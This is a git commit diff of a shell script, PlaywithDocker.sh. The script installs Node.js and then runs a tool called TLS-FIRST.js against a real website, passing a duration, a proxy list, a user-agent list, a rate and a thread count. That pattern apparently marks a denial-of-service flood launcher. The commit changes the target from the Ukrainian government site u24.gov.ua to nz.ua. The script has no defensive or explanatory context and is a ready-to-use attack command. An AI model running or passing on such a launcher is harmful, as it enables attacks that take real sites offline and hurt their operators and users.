4bd85656bbc3f7c9ad3dda1f07c3098e3faf6685
GolubevsEv <124365636+GolubevsEv@users.noreply.github.com>
2023-07-16 23:52:59 +0300

    Update PlaywithDocker.sh

--- PlaywithDocker.sh
+++ PlaywithDocker.sh
@@ -6,4 +6,4 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://u24.gov.ua/ 500 http.txt ua.txt 10 64
+node TLS-FIRST.js https://nz.ua/ 500 http.txt ua.txt 10 64
